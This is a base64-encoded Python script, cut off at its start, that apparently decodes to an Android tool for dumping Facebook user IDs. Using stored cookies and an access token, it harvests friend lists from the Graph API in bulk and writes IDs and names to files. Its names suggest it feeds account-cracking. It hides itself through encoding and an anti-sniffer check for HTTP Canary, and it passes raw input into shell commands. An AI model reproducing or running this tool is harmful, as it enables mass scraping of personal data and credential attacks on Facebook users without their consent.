gOiAnKQogICAgICAgIGlmIGNyZWF0ZV8gPT0gIjEiOgogICAgICAgICAgICAgICAgY3JlYXRlX2ZpbGVfbG9naW4oKQogICAgICAgIGVsaWYgY3JlYXRlXyA9PSAiMiI6CiAgICAgICAgICAgICAgICBkb3VibGUoKQogICAgICAgIGVsaWYgY3JlYXRlXyA9PSAiMyI6CiAgICAgICAgICAgICAgICBzZXAoKQogICAgICAgIGVsaWYgY3JlYXRlXyA9PSAiMCI6CiAgICAgICAgICAgICAgICBtYWluKCkKICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgZXhpdCgnaW52YWxpZCBzZWxlY3QnKQogICAgICAgIG15Y3JhY2tpc3RhbigpIAoKZGVmIGNyZWF0ZV9maWxlX2xvZ2luKCk6CiAgICAgICAgaWRzID0gW10KICAgICAgICB0b3RhbCA9IFtdCiAgICAgICAgeHl6ID0gcmVxdWVzdHMuU2Vzc2lvbigpCiAgICAgICAgb3Muc3lzdGVtKCdjbGVhcicpCiAgICAgICAgcHJpbnQobG9nbyk7eGNoa2VyKCkKICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICBjb2sgPSBvcGVuKCdmYl9jb29raWVzLnR4dCcsJ3InKS5yZWFkKCkKICAgICAgICAgICAgICAgIGNvb2tpZXMgPSB7J2Nvb2tpZSc6Y29rfQogICAgICAgICAgICAgICAgYWNjZXNzX3Rva2VuID0gb3BlbignYWNjZXNzX3Rva2VuLnR4dCcsICdyJykucmVhZCgpCiAgICAgICAgZXhjZXB0IEZpbGVOb3RGb3VuZEVycm9yOgogICAgICAgICAgICAgICAgbG9naW4oKQogICAgICAgIHRyeToKICAgICAgICAgICAgICAgIGNoZWNrX2Nvb2tpZXMgPSB4eXouZ2V0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS9tZT9hY2Nlc3NfdG9rZW49JythY2Nlc3NfdG9rZW4sY29va2llcz1jb29raWVzKS50ZXh0CiAgICAgICAgICAgICAgICBsb2FkID0ganNvbi5sb2FkcyhjaGVja19jb29raWVzKQogICAgICAgICAgICAgICAgaWlkID0gbG9hZFsnaWQnXQogICAgICAgICAgICAgICAgbmFtZSA9IGxvYWRbJ25hbWUnXQogICAgICAgIGV4Y2VwdCBLZXlFcnJvcjoKICAgICAgICAgICAgICAgIHByaW50KCdcbiBDb29raWVzIGhhcyBleHBpcmVkJykKICAgICAgICAgICAgICAgIHRpbWUuc2xlZXAoMSkKICAgICAgICAgICAgICAgIG9zLnN5c3RlbSgncm0gLXJmIC5mYl9jb29raWVzLnR4dCAuYWNjZXNzX3Rva2VuLnR4dCcpCiAgICAgICAgICAgICAgICBsb2dpbigpCiAgICAgICAgZXhjZXB0IHJlcXVlc3RzLmV4Y2VwdGlvbnMuQ29ubmVjdGlvbkVycm9yOgogICAgICAgICAgICAgICAgcHJpbnQoJyBObyBpbnRlcm5ldCBjb25uZWN0aW9uIC4uLicpCiAgICAgICAgb3Muc3lzdGVtKCdjbGVhcicpCiAgICAgICAgcHJpbnQobG9nbyk7eGNoa2VyKCkKICAgICAgICBwcmludCgiWzFdIENyZWF0ZSBGaWxlIE1peCBJZHMiKQogICAgICAgIHByaW50KCJbMl0gQ3JlYXRlIEZpbGUgTmV3IElkcyIpCiAgICAgICAgcHJpbnQoNDQqIi0iKQogICAgICAgIHR5cHAgPSBpbnB1dCgnc2VsZWN0IDogJykKICAgICAgICBpZiB0eXBwID09ICIxIjoKICAgICAgICAgICAgICAgIGF1dG9fZmlsZShjb29raWVzLGFjY2Vzc190b2tlbikKICAgICAgICBlbGlmIHR5cHAgPT0gIjIiOgogICAgICAgICAgICAgICAgbmV3X2ZpbGUoY29va2llcyxhY2Nlc3NfdG9rZW4pCiAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgIGF1dG9fZmlsZShjb29raWVzLGFjY2Vzc190b2tlbikKCmRlZiBhdXRvX2ZpbGUoY29va2llcyxhY2Nlc3NfdG9rZW4pOgogICAgICAgIGdsb2JhbCB0b3RhbAogICAgICAgIG9zLnN5c3RlbSgnY2xlYXIgJiBybSAtcmYgLnR4dCAudGVtcC50eHQnKQogICAgICAgIG9zLnN5c3RlbSgnY2xlYXInKQogICAgICAgIHByaW50KGxvZ28pO3hjaGtlcigpCiAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgZmwgPSAxCiAgICAgICAgZXhjZXB0OgogICAgICAgICAgICAgICAgZmwgPSAxCiAgICAgICAgZm9yIHhkIGluIHJhbmdlKGZsKToKICAgICAgICAgICAgICAgIGlkdCA9IGlucHV0KGYnIFB1dCBpZCB7eGQrMX06ICcpCiAgICAgICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICAgICAgICAgIGZkX3VybCA9ICdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8lcz9maWVsZHM9ZnJpZW5kcy5maWVsZHMoaWQsbmFtZSkmYWNjZXNzX3Rva2VuPSVzJyUoaWR0LGFjY2Vzc190b2tlbikKICAgICAgICAgICAgICAgICAgICAgICAgeHl6ID0gcmVxdWVzdHMuU2Vzc2lvbigpCiAgICAgICAgICAgICAgICAgICAgICAgIHIgPSB4eXouZ2V0KGZkX3VybCxjb29raWVzPWNvb2tpZXMpLnRleHQKICAgICAgICAgICAgICAgICAgICAgICAgcSA9IGpzb24ubG9hZHMocikKICAgICAgICAgICAgICAgICAgICAgICAgZm9yIGlpZCBpbiBxWydmcmllbmRzJ11bJ2RhdGEnXToKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB1aWQgPSBpaWRbJ2lkJ10KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBvcGVuKCcudHh0JywnYScpLndyaXRlKHVpZCsnXG4nKQogICAgICAgICAgICAgICAgZXhjZXB0IEtleUVycm9yOgogICAgICAgICAgICAgICAgICAgICAgICBwcmludCgnIE5vIEZyaWVuZCBMaXN0IDogJytpZHQpCiAgICAgICAgICAgICAgICAgICAgICAgIHRpbWUuc2xlZXAoMykKICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGF1dG9fZmlsZShjb29raWVzLGFjY2Vzc190b2tlbikKICAgICAgICAgICAgICAgIGV4Y2VwdCByZXF1ZXN0cy5leGNlcHRpb25zLkNvbm5lY3Rpb25FcnJvcjoKICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoJyBObyBpbnRlcm5ldCBjb25uZWN0aW9uIC4uLi4nKQogICAgICAgIHNpZCA9ICIxIgogICAgICAgIG9zLnN5c3RlbSgnY2F0IC50eHQgfCBncmVwICInK3NpZCsnIiA+IC50ZW1wLnR4dCcpCiAgICAgICAgZmlsZSA9IG9wZW4oJy50ZW1wLnR4dCcsJ3InKS5yZWFkKCkuc3BsaXRsaW5lcygpCiAgICAgICAgcHJpbnQoJ1xuIFwwMzNbMTs5N20gL3NkY2FyZC94eHgxLnR4dCBcMDMzWzA7OTdtXG4nKQogICAgICAgICMxMDAwMTAxMzgzNjExNDgKICAgICAgICBzZiA9IGlucHV0KCcgU2F2ZWQgRmlsZSBBcyA6ICcpCiAgICAgICAgcHJpbnQoJycpCiAgICAgICAgb3Muc3lzdGVtKCdjbGVhcicpCiAgICAgICAgcHJpbnQobG9nbyk7eGNoa2VyKCkKICAgICAgICBwcmludCgnIFRvdGFsIGlkcyBUbyBEdW1wOiAnK3N0cihsZW4oZmlsZSkpKQogICAgICAgIHByaW50KCcgRHVtcGluZyBJcyBTdGFydGVkIFdhaXQgLi4uLicpCiAgICAgICAgcHJpbnQoNTAqJy0nKQogICAgICAgIHdpdGggVGhyZWFkUG9vbChtYXhfd29ya2Vycz0yMCkgYXMgeWFhcmk6CiAgICAgICAgICAgICAgICBmb3IgZXhpZCBpbiBmaWxlOgogICAgICAgICAgICAgICAgICAgICAgICB5YWFyaS5zdWJtaXQoaWFtQmFkQm95LCBleGlkLGNvb2tpZXMsYWNjZXNzX3Rva2VuLHNmKQogICAgICAgIHByaW50KCcgVG90YWwgaWRzIEV4dHJhY3RlZCA6ICcrc3RyKGxlbih0b3RhbCkpKQogICAgICAgIGlucHV0KCcgUHJlc3MgZW50ZXIgdG8gYmFjayAnKQogICAgICAgIG1haW4oKQoKZGVmIG5ld19maWxlKGNvb2tpZXMsYWNjZXNzX3Rva2VuKToKICAgICAgICBnbG9iYWwgdG90YWwKICAgICAgICBvcy5zeXN0ZW0oJ2NsZWFyICYgcm0gLXJmIC50eHQgLnRlbXAudHh0JykKICAgICAgICBvcy5zeXN0ZW0oJ2NsZWFyJykKICAgICAgICBwcmludChsb2dvKTt4Y2hrZXIoKQogICAgICAgIHRyeToKICAgICAgICAgICAgICAgIGZsID0gMQogICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgICAgIGZsID0gMQogICAgICAgIGZvciB4ZCBpbiByYW5nZShmbCk6CiAgICAgICAgICAgICAgICBpZHQgPSBpbnB1dChmJyBQdXQgaWQge3hkKzF9OiAnKQogICAgICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgICAgICAgICBmZF91cmwgPSAnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vJXM/ZmllbGRzPWZyaWVuZHMuZmllbGRzKGlkLG5hbWUpJmFjY2Vzc190b2tlbj0lcyclKGlkdCxhY2Nlc3NfdG9rZW4pCiAgICAgICAgICAgICAgICAgICAgICAgIHh5eiA9IHJlcXVlc3RzLlNlc3Npb24oKQogICAgICAgICAgICAgICAgICAgICAgICByID0geHl6LmdldChmZF91cmwsY29va2llcz1jb29raWVzKS50ZXh0CiAgICAgICAgICAgICAgICAgICAgICAgIHEgPSBqc29uLmxvYWRzKHIpCiAgICAgICAgICAgICAgICAgICAgICAgIGZvciBpaWQgaW4gcVsnZnJpZW5kcyddWydkYXRhJ106CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdWlkID0gaWlkWydpZCddCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgb3BlbignLnR4dCcsJ2EnKS53cml0ZSh1aWQrJ1xuJykKICAgICAgICAgICAgICAgIGV4Y2VwdCBLZXlFcnJvcjoKICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoJyBObyBGcmllbmQgTGlzdCA6ICcraWR0KQogICAgICAgICAgICAgICAgICAgICAgICB0aW1lLnNsZWVwKDMpCiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiBhdXRvX2ZpbGUoY29va2llcyxhY2Nlc3NfdG9rZW4pCiAgICAgICAgICAgICAgICBleGNlcHQgcmVxdWVzdHMuZXhjZXB0aW9ucy5Db25uZWN0aW9uRXJyb3I6CiAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KCcgTm8gaW50ZXJuZXQgY29ubmVjdGlvbiAuLi4uJykKICAgICAgICBwcmludCgnXG5cMDMzWzE7OTJtIEV4YW1wbGU6IDEwMDA4NywxMDAwODggZXRjXDAzM1swOzk3bScpCiAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgc2wgPSBpbnQoaW5wdXQoJ1xuIEhvdyBNYW55IExpbmtzIFRvIEdyYWIgOiAnKSkKICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgICAgICBzbCA9IDEKICAgICAgICBmb3IgZWwgaW4gcmFuZ2Uoc2wpOgogICAgICAgICAgICAgICAgc2lkID0gaW5wdXQoZicgUHV0IHtlbCsxfSBsaW5rOiAnKQogICAgICAgICAgICAgICAgb3Muc3lzdGVtKCdjYXQgLnR4dCB8IGdyZXAgIicrc2lkKyciID4gLnRlbXAudHh0JykKICAgICAgICBmaWxlID0gb3BlbignLnRlbXAudHh0JywncicpLnJlYWQoKS5zcGxpdGxpbmVzKCkKICAgICAgICBwcmludCgnXG4gXDAzM1sxOzk3bSAvc2RjYXJkL3h4eDEudHh0IFwwMzNbMDs5N21cbicpCiAgICAgICAgIzEwMDAxMDEzODM2MTE0OAogICAgICAgIHNmID0gaW5wdXQoJyBTYXZlZCBGaWxlIEFzIDogJykKICAgICAgICBwcmludCgnJykKICAgICAgICBvcy5zeXN0ZW0oJ2NsZWFyJykKICAgICAgICBwcmludChsb2dvKTt4Y2hrZXIoKQogICAgICAgIHByaW50KCcgVG90YWwgaWRzIFRvIER1bXA6ICcrc3RyKGxlbihmaWxlKSkpCiAgICAgICAgcHJpbnQoJyBEdW1waW5nIElzIFN0YXJ0ZWQgV2FpdCAuLi4uJykKICAgICAgICBwcmludCg1MConLScpCiAgICAgICAgd2l0aCBUaHJlYWRQb29sKG1heF93b3JrZXJzPTIwKSBhcyB5YWFyaToKICAgICAgICAgICAgICAgIGZvciBleGlkIGluIGZpbGU6CiAgICAgICAgICAgICAgICAgICAgICAgIHlhYXJpLnN1Ym1pdChpYW1CYWRCb3ksIGV4aWQsY29va2llcyxhY2Nlc3NfdG9rZW4sc2YpCiAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgc29uID0gZiJxYWlzZXJ7c3RyKHJhbmRvbS5yYW5kaW50KDAsOTApKX0udHh0IgogICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgICAgIHNvbiA9IGYicWFpc2Vye3N0cihyYW5kb20ucmFuZGludCgxMCw1MCkpfS50eHQiCiAgICAgICAgb3Muc3lzdGVtKGYnY2F0IHtzZn0gfCBncmVwICInK3NpZCsnIiA+IC9zZGNhcmQvJytzb24rJycpCiAgICAgICAgcHJpbnQoJyBUb3RhbCBpZHMgRXh0cmFjdGVkIDogJytzdHIobGVuKHRvdGFsKSkpCiAgICAgICAgcHJpbnQoJyBOZXcgaWRzIFNhdmVkIEFzIDogL3NkY2FyZC8nK3NvbikKICAgICAgICBwcmludCgnIE5vcm1hbCBpZHMgU2F2ZWQgQXMgOiAnK3NmKQogICAgICAgIGlucHV0KCcgUHJlc3MgZW50ZXIgdG8gYmFjayAnKQogICAgICAgIG1haW4oKQoKZGVmIGlhbUJhZEJveShleGlkLGNvb2tpZXMsYWNjZXNzX3Rva2VuLHNmKToKICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICBnbG9iYWwgdG90YWwsbG9vcAogICAgICAgICAgICAgICAgZmRfdXJsID0gJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLyVzP2ZpZWxkcz1mcmllbmRzLmZpZWxkcyhpZCxuYW1lKSZhY2Nlc3NfdG9rZW49JXMnJShleGlkLGFjY2Vzc190b2tlbikKICAgICAgICAgICAgICAgIHh5eiA9IHJlcXVlc3RzLlNlc3Npb24oKQogICAgICAgICAgICAgICAgciA9IHh5ei5nZXQoZmRfdXJsLGNvb2tpZXM9Y29va2llcykudGV4dAogICAgICAgICAgICAgICAgcSA9IGpzb24ubG9hZHMocikKICAgICAgICAgICAgICAgIGZvciB5YWFkIGluIHFbJ2ZyaWVuZHMnXVsnZGF0YSddOgogICAgICAgICAgICAgICAgICAgICAgICBpaWQgPSB5YWFkWydpZCddCiAgICAgICAgICAgICAgICAgICAgICAgIG5hbWUgPSB5YWFkWyduYW1lJ10KICAgICAgICAgICAgICAgICAgICAgICAgdG90YWwuYXBwZW5kKGlpZCkKICAgICAgICAgICAgICAgICAgICAgICAgb3BlbihzZiwnYScpLndyaXRlKGlpZCsnfCcrbmFtZSsnXG4nKQogICAgICAgICAgICAgICAgbG9vcCs9MQogICAgICAgICAgICAgICAgc3lzLnN0ZG91dC53cml0ZSgnXHIgRHVtcGluZyBJZHMgWyVzXSA6IFslc11cciclKGxvb3AsbGVuKHRvdGFsKSkpO3N5cy5zdGRvdXQuZmx1c2goKQogICAgICAgIGV4Y2VwdCByZXF1ZXN0cy5leGNlcHRpb25zLkNvbm5lY3Rpb25FcnJvcjoKICAgICAgICAgICAgICAgIHByaW50KCcgTm8gaW50ZXJuZXQgY29ubmVjdGlvbiAuLi4nKQogICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICAgICAgICAgIHBhc3MKICAgICAgICAgICAgICAgICNwcmludChlKQogICAgICAgIGV4Y2VwdCBLZXlFcnJvcjoKICAgICAgICAgICAgICAgIHBhc3MKCmRlZiBzZXAoKToKICAgICAgICB4Y2hrZXIoKQogICAgICAgIG9zLnN5c3RlbSgnY2xlYXInKTtwcmludChsb2dvKTt4Y2hrZXIoKQogICAgICAgIHRyeToKICAgICAgICAgICAgICAgIGxpbWl0ID0gaW50KGlucHV0KCcgSG93IG1hbnkgbGlua3MgZG8geW91IHdhbnQgdG8gc2VwYXJhdGUgPyAnKSkKICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgICAgICBsaW1pdCA9IDEKICAgICAgICBwcmludChmJ3tyZ30gRmlsZSBQYXRoIEV4YW1wbGUgL3NkY2FyZC94eHgudHh0e3N9JykKICAgICAgICBmaWxlX25hbWUgPSBpbnB1dCgnXDAzM1swbSBJbnB1dCBmaWxlIHBhdGggOiAnKQogICAgICAgIHByaW50KGYne3JnfSBTYXZlIEFzIEV4YW1wbGUgL3NkY2FyZC9uZXdmaWxlLnR4dHtzfScpCiAgICAgICAgbmV3X3NhdmUgPSBpbnB1dCgnXDAzM1swbSBTYXZlIG5ldyBmaWxlIGFzIDogJykKICAgICAgICB5ID0gMAogICAgICAgIHByaW50KGYie3JvfSBJZHMgVG8gR3JhYmIgRXggWyAxMDAwODcsMTAwMDAsMTAwMDYgZXRjIF17c30iKQogICAgICAgIGZvciBrIGluIHJhbmdlKGxpbWl0KToKICAgICAgICAgICAgICAgIHkrPTEKICAgICAgICAgICAgICAgIGxpbmtzPWlucHV0KCcgUHV0IFVpZCBUeXBlIDogJykKICAgICAgICAgICAgICAgIG9zLnN5c3RlbSgnY2F0ICcrZmlsZV9uYW1lKycgfCBncmVwICInK2xpbmtzKyciID4+ICcrbmV3X3NhdmUpCiAgICAgICAgcHJpbnQoNDQqIlwwMzNbMG0tIikKICAgICAgICBwcmludChmJ3tyY30gaWRzIGdyYWJiZWQgc3VjY2Vzc2Z1bGx5e3N9JykKICAgICAgICBwcmludCgnIFRvdGFsIGdyYWJiZWQgaWRzIDpcMDMzWzA7MzNtICcrc3RyKGxlbihvcGVuKG5ld19zYXZlKS5yZWFkKCkuc3BsaXRsaW5lcygpKSkpCiAgICAgICAgcHJpbnQoJ1wwMzNbMG0gTmV3IGZpbGUgc2F2ZWQgYXMgOiBcMDMzWzA7MzNtICcrbmV3X3NhdmUpCiAgICAgICAgcHJpbnQoNDQqIlwwMzNbMG0tIikKICAgICAgICBpbnB1dCgnXDAzM1swbVtQcmVzcyBlbnRlciB0byBiYWNrXSAnKQogICAgICAgIG1haW4oKQoKZGVmIGRvdWJsZSgpOgogICAgICAgIG9zLnN5c3RlbSgnY2xlYXInKQogICAgICAgIHByaW50KGxvZ28pO3hjaGtlcigpCiAgICAgICAgdXNlcl9maWxlID0gaW5wdXQoJ0ZpbGUgUGF0aCA6ICcpCiAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgb3Blbih1c2VyX2ZpbGUsJ3InKS5yZWFkKCkKICAgICAgICAgICAgICAgIHByaW50KCcgXG5cMDMzWzE7OTdtRXhhbXBsZTogL3NkY2FyZC94eHgudHh0XG5cMDMzWzA7OTdtJykKICAgICAgICAgICAgICAgIHNhdmVfZmlsZSA9IGlucHV0KCdTYXZlIG5ldyBmaWxlIGFzOiAnKQogICAgICAgICAgICAgICAgb3Muc3lzdGVtKCd0b3VjaCAnK3NhdmVfZmlsZSkKICAgICAgICAgICAgICAgIG9zLnN5c3RlbSgnc29ydCAtciAnK3VzZXJfZmlsZSsnIHwgdW5pcSA+ICcrc2F2ZV9maWxlKQogICAgICAgICAgICAgICAgcHJpbnQoNTAqJy0nKQogICAgICAgICAgICAgICAgcHJpbnQoJyBGdWxseSBSZW1vdmVkIE11bHRpIExpbmVzIElkcycpCiAgICAgICAgICAgICAgICBwcmludCgnIER1YmxpY2F0ZSBMaW5lcyBSZW1vdmVkIEZyb20gRmlsZScpCiAgICAgICAgICAgICAgICBwcmludCgnIEZpbGUgU2F2ZWQgQXMgOiAnK3NhdmVfZmlsZSkKICAgICAgICAgICAgICAgIHByaW50KDUwKictJykKICAgICAgICAgICAgICAgIGlucHV0KCdQcmVzcyBlbnRlciB0byBiYWNrICcpCiAgICAgICAgICAgICAgICBtYWluKCkKICAgICAgICBleGNlcHQgRmlsZU5vdEZvdW5kRXJyb3I6CiAgICAgICAgICAgICAgICBwcmludCgnIEludmFsaWQgRmlsZSAnKQp0cnk6CiAgICAgICAgYSA9ICJhbmFyIgogICAgICAgIHQ9InR0IgogICAgICAgIGZpbGVlZSA9IG9zLmxpc3RkaXIoJy9zZGNhcmQvQW5kcm9pZC9kYXRhLycpCiAgICAgICAgaWYgZidjb20uaHt0fXBje2F9eS5wcm8nIGluIGZpbGVlZToKICAgICAgICAgICAgICAgIHByaW50KCdlcnJvciBvY2N1ciAwJykKICAgICAgICAgICAgICAgICNleGl0KCkpCmV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICBwcmludChlKQogICAgICAgIHBhc3MKZXhjZXB0IFBlcm1pc3Npb25FcnJvcjoKICAgICAgICBwYXNzCm1haW4oKQo="))